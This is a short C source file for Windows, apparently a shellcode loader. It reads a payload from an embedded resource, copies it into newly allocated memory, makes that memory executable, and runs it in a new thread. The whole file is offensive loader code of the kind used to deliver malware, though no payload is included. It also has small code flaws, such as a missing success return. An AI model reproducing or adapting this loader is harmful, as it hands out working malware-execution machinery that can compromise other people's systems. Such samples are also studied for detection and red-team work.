#include <windows.h>
#include <stdio.h>
#include "resource.h"

int getResoucePayload(OUT PVOID* ppPayloadAddress, OUT SIZE_T* psPayloadSize)
{
	HRSRC		hRsrc = NULL;
	HGLOBAL		hGlobal = NULL;

	hRsrc = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
	if (hRsrc == NULL) {
		return -1;
	}

	hGlobal = LoadResource(NULL, hRsrc);
	if (hGlobal == NULL) {
		return -1;
	}

	*ppPayloadAddress = LockResource(hGlobal);
	if (*ppPayloadAddress == NULL) {
		return -1;
	}

	*psPayloadSize = SizeofResource(NULL, hRsrc);
	if (*psPayloadSize == NULL) {
		return -1;
	}

}

int main()
{
	// Get Payload from Resource
	PVOID		pPayloadAddress = NULL;
	SIZE_T		sPayloadSize = NULL;
	getResoucePayload(&pPayloadAddress, &sPayloadSize);
	
	// Allocate and copy over
	PVOID pPayloadBuffer = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pPayloadBuffer == NULL) {
		return -1;
	}
	memcpy(pPayloadBuffer, pPayloadAddress, sPayloadSize);

	// Change page protection
	DWORD flOldProtect;
	if (!VirtualProtect(pPayloadBuffer, sPayloadSize, PAGE_EXECUTE_READWRITE, &flOldProtect)) {
		return -1;
	}

	// Run and wait for thread to exit
	HANDLE hThread = CreateThread(NULL, NULL, pPayloadBuffer, NULL, NULL, NULL);
	WaitForSingleObject(hThread, 2000);

}

